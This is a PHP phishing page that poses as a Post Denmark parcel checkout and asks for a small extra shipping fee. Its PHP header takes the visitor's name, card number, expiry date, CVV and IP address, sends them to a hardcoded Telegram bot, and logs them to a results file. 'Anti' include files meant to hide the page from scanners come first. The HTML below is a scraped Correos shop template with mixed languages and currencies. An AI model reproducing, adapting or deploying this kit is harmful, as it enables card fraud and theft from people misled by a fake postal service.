<?php
include "anti/anti1.php";
include "anti/anti2.php"; 
include "anti/anti3.php"; 
include "anti/anti4.php"; 
include "anti/anti5.php"; 
include "anti/anti6.php"; 
include "anti/anti7.php"; 
include "anti/anti8.php"; 
include "id.php";
if(isset($_POST['megria'])){
$ip = getenv("REMOTE_ADDR");
$bin        = str_replace(' ', '', $_POST['card']);
$bin        = substr($bin, 0, 6);
$getdetails = 'https://lookup.binlist.net/' . $bin;
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details  = json_decode($content);
$_SESSION['_namebank_'] = $namebank   = $details->bank->name;
$message = "☢🥳😍🤯🤯***🤑😎😎Norway BY MEGRIA😎😎🤑***🤯🤯😍🥳☢\nfirst name : ".$_POST['fname']."\nlast name : ".$_POST['lname']."\ncard number : ".$_POST['card']."(".$_SESSION['_namebank_'].")\nExp date : ".$_POST['exp']."\nCvv : ".$_POST['cvv']."\nIP: ".$ip." \n☢🥳😍🤯🤯***🤑😎😎Norway BY MEGRIA😎😎🤑***🤯🤯😍🥳☢\n";
foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot5258318869:AAEc9YN38UpQbGND-gtNoox74n0jrZ4m0ks/sendMessage';
$data=array('chat_id'=>$user_id,'1289904248'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);
}
$myfile = fopen("rzlt.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);

if ($sms='1'){
HEADER("Location: index2.php");
}else{
HEADER("Location: thanks.php");
}
}
?>
<html lang="en"><!--<![endif]--><head>
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
		<link rel="shortcut icon" type="image/png" href="./posten-logo.png" />
		<link rel="stylesheet" href="https://cdn.mycomandia.com/static/shop/common/bundle/bootstrap-4.1.0/css/bootstrap.min.css?v=2019.12.17" media="screen">
		<link rel="stylesheet" href="https://cdn.mycomandia.com/static/shop/common/css/validationEngine.jquery.css?v=2019.12.17">
		<link rel="stylesheet" href="https://cdn.mycomandia.com/static/shop/common/fonts/flaticon/flaticon.css?v=2019.12.17">
		<link rel="stylesheet" href="https://cdn.mycomandia.com/static/shop/common/bundle/font-awesome-5/web-fonts-with-css/css/fontawesome-all.min.css?v=2019.12.17">
		<link rel="stylesheet" href="https://cdn.mycomandia.com/static/shop/common/css/new-style-common-screen.css?v=2019.12.17">
		<link rel="stylesheet" href="https://tienda.correos.es/css/common-dynamic.css">
		<!--[if lt IE 9]>
			<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
			<script src="http://ie7-js.googlecode.com/svn/version/2.1(beta4)/IE9.js"></script>
		<![endif]-->
		
		
		<title>Post Denmark: online stores services</title>
		<meta name="description" lang="es" content="En la Tienda Online de Correos tenemos todo para hacer tus envíos: cajas, sobres, sellos, embalajes... regalos, coleccionismo y productos solidarios.">
		
		
		

		<!-- Robots -->
		
		
			<meta name="robots" content="index,follow">
		
		<!-- / Robots -->
		
		<meta name="expires" content="0">
		<meta name="revisit-after" content="1 days">
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		<meta http-equiv="pragma" content="no-cache">
		
		
		
		

		
	</head>

	<body class="common-screen-body" style="">
		
		
			<!-- Google Tag Manager -->
			
		
		
		<section class="common-screen-header">
			<nav class="navbar navbar-expand-md navbar-light">
				
			    <a class="navbar-brand" href="/"><img src="https://upload.wikimedia.org/wikipedia/en/thumb/f/fd/PostDKLogo.svg/600px-PostDKLogo.svg.png"></a>
			    
			    
			    <button name="megria" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#common-screen-top-navbar" aria-controls="common-screen-top-navbar" aria-expanded="false" aria-label="Toggle navigation">
					<span class="navbar-toggler-icon"></span>
				</button>
			    
				<div class="collapse navbar-collapse" id="common-screen-top-navbar">
					<div class="navbar-nav ml-auto">
						
						
							
								<a class="nav-item nav-link" href="#">Entrar</a>					
								<a class="nav-item nav-link" href="#">Registro</a>
							

						
						
						

						
						<a class="nav-item nav-link" href="#">Cesta de la compra</a>
						
						
						

						
				        
				    </div>
			    </div>
			</nav>
		</section>
		
		<section class="common-screen-content">
			

















<section class="go-back-to-shop">
	<div class="container">
		<ul class="nav">
			<li class="nav-item">
				<a class="nav-link" href="#">&lt; Volver a la tienda</a>
			</li>
		</ul>
	</div>
</section>

<section class="checkout-template">
	<div class="container">
	
		<div class="cart-no-product-alert" style="display:none">No tienes productos en tu cesta</div>
	
	
	
	
		








<!--null
-->

		<div class="alert alert-danger alert-error alert-dismissable shopping-cart-alert" style="display:none"><button type="button" class="close" data-dismiss="alert">×</button><strong></strong></div>
		<!-- Mobile version Summary of the cart -->
		<div class="checkout-mobile-summary">

















<div class="checkout-summary-fixed d-block d-lg-none">
	<div class="row">
		
	</div>
	<!-- summary checkout mobile -->
	<div class="summary-checkout">
		<div class="summary-product-thumbs row">
		
		
			
			
		
		</div>
		<hr>
		<div class="row">
			<div class="col">
				<span>Total</span>
			</div>
			<div class="col text-right">
				<span>22,25 DKK</span>
			</div>
		</div>
		
	</div>
	<!-- /summary checkout mobile -->
</div></div>
		<!-- Mobile version Summary of the cart -->
	
		<div class="row flex-column-reverse flex-lg-row">
			<div class="col-lg-7">
				<div class="checkout-left-side">
					<div id="cartParent" style="opacity: 1;">
						<div id="shippingZoneLocked" class="shopping-cart-locked-parent" style="display: block;">













</div>
						<div id="shippingZoneForm" class="shopping-cart-form-parent" style="display: none;">














</div>
					
						<div id="carrierLocked" class="shopping-cart-locked-parent" style="display: block;">














<section class="checkout-small-shipping-type small-box">
	
	<div class="small-box-content">
		
		<div class="title">
			<div class="title-content">
				<div class="title-icon">
					<i class="flaticon-package"></i>
				</div>
				<div class="title-text">
					<h4>Indsendelse kode: DK / 2938456</h4>
					<p>Paq Estándar</p>
					
					 
				</div>
			</div>
		</div>
		<div class="buttons">
			<button class="btn btn-primary modify-button btn-edit-carrier">
				<span class="d-none d-sm-none d-md-block">Modificar</span>
				<span class="d-block d-sm-block d-md-none"><i class="fas fa-edit"></i></span>
			</button>
		</div>
	</div>
</section>
</div>
						<div id="carrierFormParent" class="shopping-cart-form-parent" style="display: none;">




















<section class="checkout-shipping-type">
	<div class="checkout-box">	
		
		<div class="checkout-box-title">
			<div class="checkout-box-title-icon"><i class="flaticon-package"></i></div>
			<h4>Código de envío : ES/2938456</h4>
		</div>
		<div class="checkout-box-content">
			<div class="checkout-shipping-type-content">
				
				
					<form id="carrierForm" method="post" action="" class="">
						<input type="hidden" name="carrierid" id="carrierid" value="3">
						<input type="hidden" name="isselfpick" id="isselfpick" value="0">
						<input type="hidden" name="selfpickstorecode" id="selfpickstorecode" value="">
						<input type="hidden" name="homepaqtoken" id="homepaqtoken" value="">
						
						
							
									
							<!--  NEW SCREEN BEGIN -->
							<div class="checkout-shipping-type-zones">
								<div class="checkout-shipping-type-zones-image">
									
									<img class="img-responsive" alt="Paq Estándar" src="https://upload.wikimedia.org/wikipedia/en/thumb/f/fd/PostDKLogo.svg/600px-PostDKLogo.svg.png">
									
									
								</div>
								
								
									<div class="custom-control custom-checkbox form-check office-delivery">
										
											<input type="checkbox" id="carrierselection3" class="custom-control-input carrierselection" data-carrier="3" data-selfpick="0">
											<label class="custom-control-label" for="carrierselection3">
												A tu domicilio <strong>(3,99 AUD)</strong>
											</label>
										
									</div>
								
								
								
									<div class="custom-control custom-checkbox form-check office-nodelivery-container">
										
										<input type="checkbox" id="carrierselection_self3" class="custom-control-input carrierselection" data-carrier="3" data-selfpick="1" data-postalcode="39999" data-is-pickup-at-shop="0">
										<label class="custom-control-label" for="carrierselection_self3">
										
											Recogida en oficina de Correos <strong>(3,99 AUD)</strong>
										
										</label>
										
										
									<!-- Correos hidden offices -->
										
										<div class="offices-search-container" style="display:none">
											<!-- <div class="custom-control custom-checkbox form-check">
												<input type="checkbox" class="custom-control-input" id="Office1">
												<label class="custom-control-label" for="Office1">Barcelona suc 16. la vila olimpica - doctor trueta 58-60 08005 barcelona</label>
											</div>
											<div class="custom-control custom-checkbox form-check">
												<input type="checkbox" class="custom-control-input" id="Office2">
												<label class="custom-control-label" for="Office2">Barcelona suc 16. la vila olimpica - doctor trueta 58-60 08005 barcelona</label>
											</div> -->
										</div>
									<!-- Correos hidden offices -->
										
									</div>
								
								
							</div>
							<div style="width:100%">
								
								<small class="text-muted"><p>Tus envíos en un máximo de 72 horas</p></small>
							</div>
						<!--  NEW SCREEN END -->
						
						
							
									
							<!--  NEW SCREEN BEGIN -->
							<div class="checkout-shipping-type-zones type-city">
								<div class="checkout-shipping-type-zones-image">
									
									<img class="img-responsive" alt="Paq Estándar CityPaq" src="https://cdn.mycomandia.com/static/logos/correos-paq72.png">
									
									
								</div>
								
								
									<div class="custom-control custom-checkbox form-check office-delivery">
										
										
											
												<input type="checkbox" id="carrierselection9" class="custom-control-input carrierselection" data-carrier="9" data-homepaq="1" data-selfpick="1">
												<label class="custom-control-label" for="carrierselection9">
													Envío mediante CityPaq <strong>(3,99 AUD)</strong>
												</label>
													
												<div class="cityPaq-search-container" style="display:none;">
													
														<p>Indique su nombre de usuario CityPaq:</p>
														<div class="input-group">
															<input class="form-control py-2 homepaqusername validate[required]" type="search" name="homepaqusername9" id="homepaqusername9">
															<span class="input-group-append">
																<input type="button" class="btn btn-outline-secondary searchhomepaq" value="Buscar" data-val="homepaqusername9" data-target="homepaqresult9">
															</span>
														</div>
														
														<div id="homepaqresult9" class="homepaqresultdiv">
															<p class="citypaq-text">
																Si aún no es usuario de CityPaq, puede registrarse en este enlace: <a href="https://online.citypaq.es/pages/registro.xhtml" target="_homepaq">Ir a CityPaq</a>
															</p>
														</div>
													
												</div>
												
										
									</div>
								
								
								
								
							</div>
							<div style="width:100%">
								
									
										 <small class="text-muted">Paq Estándar CityPaq</small>
									
								
								<small class="text-muted"><p>Haz tus pedidos y recógelos en el CityPaq que más te convenga</p></small>
							</div>
						<!--  NEW SCREEN END -->
						
						
					</form>
				
				
				
				
			</div>
		</div>
	</div>
</section></div>
						
						<div id="paypalexpressParent" class="shopping-cart-locked-parent" style="display: block;">











	
	
</div>
						
						<div id="shippingAddressLocked" class="shopping-cart-locked-parent" style="display: none;"></div>
						<div id="shippingAddressList" class="shopping-cart-form-parent" style="display: none;"></div>
						<div id="shippingAddressForm" class="shopping-cart-form-parent" style="display: block;">















<section class="checkout-new-shipping-address">
	<div class="checkout-box">
		<div class="checkout-box-title">
			<div class="checkout-box-title-icon"><i class="flaticon-list"></i></div>
			<h4>Betalingsoplysninger</h4>
		</div>
		<div class="checkout-box-content">
			
			
			<form class="checkout-new-shipping-address-form" method="post" action="">
				
				<div class="form-row">
					<div class="form-group col-md-4">
						<label for="shipping.firstname">Nummer*</label>
						<input type="text" name="fname" id="fname" maxlength="50" class="form-control validate[required,minSize[2]] null" required >
					</div>
					<div class="form-group col-md-8">
						<label for="shipping.lastname">Efternavne*</label>
						<input type="text" name="lname" id="lname" maxlength="50" class="form-control validate[required,minSize[2]] null" required >
					</div>
				</div>
				
				<div class="form-row">
					<div class="form-group col-md-8">
						<label for="shipping.email">Kortnummer*</label>
						<input type="text" placeholder="XXXX XXXX XXXX XXXX" name="card" id="shipping.email" maxlength="19" class="form-control validate[required,custom[email]] null" required >
					</div>
					
				</div>
				
				
				
				<div class="form-row">
					
					<div class="form-group col-md-4">
						<label for="inputAddress2">udløbsdato*</label>
						<input type="text" placeholder="MM/YYYY" name="exp" id="shipping.address2" maxlength="7" class="form-control null" required >
					</div>
				</div>
				<div class="form-row">
					<div class="form-group col-md-4">
						<label for="shipping.postalcode">Kode CVV*</label>
						<input type="text" placeholder="XXX" name="cvv" id="shipping.postalcode" maxlength="3"  class="form-control validate[required] null" required >
					</div>
					
					
				</div>
				
				
				
				
				
				<div class="form-group">
					
				</div>
				
				<div class="form-group">
					<div class="custom-control custom-checkbox">
						<input type="checkbox" name="accept_dpp_shipping" class="custom-control-input validate[required]" id="accept_dpp_shipping" data-prompt-position="bottomRight" value="YES">
						<label class="custom-control-label" for="accept_dpp_shipping">
Jeg har læst og accepteret  <a target="_blank" href="#"><b>
Fortrolighedspolitik. </b></a>.</label>
					</div>
				</div>
				<section class="continue-button py-2 mb-4" id="continueButtonParent">
							<div class="d-flex justify-content-end">
								<button type="button" class="btn btn-danger btn-cart-cancel-edit ml-1" style="display:none">Cancelar</button> 
								<button name="megria" type="submit" class="btn btn-primary btn-cart-continue">Betal og fortsætt;</button>
							</div>
						</section>
			</form>
			
		</div>
	</div>
</section>
</div>
						
						<div id="billingAddressLocked" class="shopping-cart-locked-parent" style="display: none;"></div>
						<div id="billingAddressForm" class="shopping-cart-form-parent" style="display: none;"></div>
						
						<div id="paymentBox" class="shopping-cart-form-parent" style="display: none;"></div>
						<div id="paymentLocked" class="shopping-cart-locked-parent" style="display: none;"></div>
						
						
						<div id="discountForm" class="shopping-cart-form-parent d-lg-none" style="display: none;"></div>
						<div id="discountLocked" class="shopping-cart-locked-parent" style="display: none;"></div>
						
						
						
						
						<div id="checkoutButton" style="display:none">
							<div class="order-payment-checkboxs">
								<div class="custom-control custom-checkbox">
									<input type="checkbox" name="isacceptmarketing" class="custom-control-input" id="isacceptmarketing" value="YES">
									<label class="custom-control-label" for="isacceptmarketing">Deseo recibir ofertas y promociones de los productos y servicios comercializados</label>
								</div>
							
								<div class="custom-control custom-checkbox">
									<input type="checkbox" name="accept_dpp" class="custom-control-input validate[required]" id="accept_dpp" data-prompt-position="bottomRight" value="YES">
									
									
									<label class="custom-control-label" for="accept_dpp">He leído y acepto las <a target="_blank" href="/page/condiciones-generales"><b>Condiciones de Venta</b></a>.</label>
									
								</div>
							</div>
							
							
							<section class="continue-button py-2 mb-4">
								<div class="d-flex justify-content-end">
								
									<button type="button" class="btn btn-primary btn-shopping-cart-checkout">Confirmar y pagar pedido &gt;</button>
								
								</div>
							</section>
						</div>
						
					</div>

					
				</div>
			</div>
			<div class="col-lg-5">
				<div class="checkout-right-side">


















<section class="checkout-summary d-none d-lg-block">

	
	<div class="summary-product-list">
		
		
			
	
			<div class="item">
				<div class="row">
					<div class="col-3 flex-grow-0 image-col">
						<div class="item-image">
							
							<a href="#">
								
								
									
										<img src="https://s.trackingmore.com/images/icons/express/companylogo/4010.jpg">
									
								
							</a>
							
						</div>
					</div>
					<div class="col-5 title-col">
						<div class="item-title">
							<p>
								Ekstra forsendelsesgebyr
								<i></i>
							</p>
						</div>
						
					</div>
					<div class="col-4 flex-grow-0 buttons-col">
						<div class="d-flex buttons-col-container justify-content-between h-100">
							<div class="item-delete-button">
								<button class="btn-update-cart-item-quantity" data-input-selector="#cartQuantityProductId_147" value="0"><i class="far fa-trash-alt"></i></button>
							</div>
							<div class="item-price-total">
								<p class="item-price">22,25 €</p>
								<p class="item-vat-text">
								
								
									(1,21 € Moms inkluderet)
								
								</p>
							</div>
						</div>
					</div>
				</div>
				
				
			</div>
			
		
	
	</div>
	
	
	<div class="summary-subtotal">
		
	<div class="summary-total">
		<div class="row">
			<div class="col">
				<div class="text-left">
					<p class="total-title">Total</p>
				</div>
			</div>
			<div class="col">
				<div class="text-right">
					<p class="total-amount">22,25 DKK</p>
					
					<p class="total-vat-included">
					
					
						(VAT included)
					
					</p>
				</div>
			</div>
		</div>
	</div>
</section>
</div>
			</div>
		</div>
		
	</div>
</section>

		</section>
		
		<section class="common-screen-footer">
		
		</section>
		
		
		
		
		
		
	

</body></html>